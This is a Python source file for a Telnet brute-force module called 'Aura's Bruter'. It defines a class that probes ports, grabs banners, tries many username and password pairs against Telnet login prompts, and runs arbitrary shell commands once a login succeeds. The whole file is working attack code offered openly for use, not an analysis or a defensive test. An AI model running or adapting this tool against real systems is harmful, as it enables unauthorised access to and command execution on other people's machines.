#!/usr/bin/env python3
"""
Aura's Bruter - Telnet Attack Module
Telnet brute force using telnetlib
"""

import telnetlib
import socket
import re
from typing import Optional, Tuple
from dataclasses import dataclass


@dataclass
class TelnetResult:
    """Result of a Telnet connection attempt."""
    success: bool
    username: str
    password: str
    error: Optional[str] = None
    banner: Optional[str] = None


class TelnetAttacker:
    """
    Telnet brute force attack module.
    """
    
    # Common login/password prompts
    LOGIN_PROMPTS = [
        b"login:",
        b"Login:",
        b"LOGIN:",
        b"username:",
        b"Username:",
        b"user:",
        b"User:",
    ]
    
    PASSWORD_PROMPTS = [
        b"password:",
        b"Password:",
        b"PASSWORD:",
        b"pass:",
        b"Pass:",
    ]
    
    # Success/failure indicators
    SUCCESS_PATTERNS = [
        b"$",
        b"#",
        b">",
        b"welcome",
        b"Welcome",
        b"Last login",
        b"logged in",
    ]
    
    FAILURE_PATTERNS = [
        b"incorrect",
        b"failed",
        b"denied",
        b"invalid",
        b"wrong",
        b"bad",
        b"Login incorrect",
        b"Authentication failed",
    ]
    
    def __init__(
        self,
        host: str,
        port: int = 23,
        timeout: float = 10.0,
        max_retries: int = 3
    ):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_retries = max_retries
        self._banner = None
    
    def check_port_open(self) -> bool:
        """Check if the Telnet port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def get_banner(self) -> Optional[str]:
        """Get the Telnet server banner."""
        if self._banner:
            return self._banner
        
        try:
            tn = telnetlib.Telnet(self.host, self.port, timeout=self.timeout)
            # Read until we get a login prompt or timeout
            data = tn.read_until(b":", timeout=self.timeout)
            self._banner = data.decode('utf-8', errors='ignore').strip()
            tn.close()
            return self._banner
        except Exception:
            return None
    
    def _wait_for_prompt(self, tn: telnetlib.Telnet, prompts: list, timeout: float = 5.0) -> Tuple[int, bytes]:
        """Wait for any of the given prompts."""
        return tn.expect(prompts, timeout=timeout)
    
    def try_credentials(self, username: str, password: str) -> TelnetResult:
        """
        Try to authenticate with the given credentials.
        
        Args:
            username: Telnet username
            password: Telnet password
            
        Returns:
            TelnetResult with success status and details
        """
        for attempt in range(self.max_retries):
            try:
                tn = telnetlib.Telnet(self.host, self.port, timeout=self.timeout)
                
                # Wait for login prompt
                idx, match, data = self._wait_for_prompt(tn, self.LOGIN_PROMPTS, timeout=self.timeout)
                
                if idx < 0:
                    tn.close()
                    if attempt < self.max_retries - 1:
                        continue
                    return TelnetResult(
                        success=False,
                        username=username,
                        password=password,
                        error="No login prompt found"
                    )
                
                # Send username
                tn.write(username.encode('utf-8') + b"\n")
                
                # Wait for password prompt
                idx, match, data = self._wait_for_prompt(tn, self.PASSWORD_PROMPTS, timeout=self.timeout)
                
                if idx < 0:
                    tn.close()
                    return TelnetResult(
                        success=False,
                        username=username,
                        password=password,
                        error="No password prompt found"
                    )
                
                # Send password
                tn.write(password.encode('utf-8') + b"\n")
                
                # Check response
                response = tn.read_until(b"\n", timeout=self.timeout)
                response += tn.read_very_eager()
                
                tn.close()
                
                # Check for failure patterns first
                for pattern in self.FAILURE_PATTERNS:
                    if pattern.lower() in response.lower():
                        return TelnetResult(
                            success=False,
                            username=username,
                            password=password,
                            error="Authentication failed"
                        )
                
                # Check for success patterns
                for pattern in self.SUCCESS_PATTERNS:
                    if pattern in response:
                        return TelnetResult(
                            success=True,
                            username=username,
                            password=password,
                            banner=self._banner
                        )
                
                # If we got here without explicit failure, consider it failed
                return TelnetResult(
                    success=False,
                    username=username,
                    password=password,
                    error="Authentication failed"
                )
                
            except socket.timeout:
                if attempt < self.max_retries - 1:
                    continue
                return TelnetResult(
                    success=False,
                    username=username,
                    password=password,
                    error="Connection timeout"
                )
                
            except socket.error as e:
                if attempt < self.max_retries - 1:
                    continue
                return TelnetResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Socket error: {e}"
                )
                
            except Exception as e:
                return TelnetResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Unexpected error: {e}"
                )
        
        return TelnetResult(
            success=False,
            username=username,
            password=password,
            error="Max retries exceeded"
        )
    
    def execute_command(self, username: str, password: str, command: str) -> Optional[str]:
        """
        Execute a command after successful authentication.
        
        Returns:
            Command output or None if failed
        """
        try:
            tn = telnetlib.Telnet(self.host, self.port, timeout=self.timeout)
            
            # Login
            tn.read_until(b"login:", timeout=self.timeout)
            tn.write(username.encode('utf-8') + b"\n")
            
            tn.read_until(b"Password:", timeout=self.timeout)
            tn.write(password.encode('utf-8') + b"\n")
            
            # Wait for shell prompt
            tn.read_until(b"$", timeout=self.timeout)
            
            # Send command
            tn.write(command.encode('utf-8') + b"\n")
            
            # Read response
            response = tn.read_until(b"$", timeout=self.timeout)
            
            tn.write(b"exit\n")
            tn.close()
            
            return response.decode('utf-8', errors='ignore')
            
        except Exception:
            return None
    
    def get_server_info(self) -> dict:
        """Get information about the Telnet server."""
        return {
            "host": self.host,
            "port": self.port,
            "banner": self.get_banner(),
            "port_open": self.check_port_open()
        }


if __name__ == "__main__":
    from rich.console import Console
    from rich.table import Table
    
    console = Console()
    
    console.print("[yellow]Telnet Attack Module - Demo Mode[/yellow]")
    
    table = Table(title="TelnetAttacker Methods")
    table.add_column("Method", style="cyan")
    table.add_column("Description", style="white")
    
    table.add_row("check_port_open()", "Check if Telnet port is accessible")
    table.add_row("get_banner()", "Retrieve Telnet server banner")
    table.add_row("try_credentials(user, pass)", "Attempt authentication")
    table.add_row("execute_command(user, pass, cmd)", "Run command after auth")
    table.add_row("get_server_info()", "Get comprehensive server info")
    
    console.print(table)
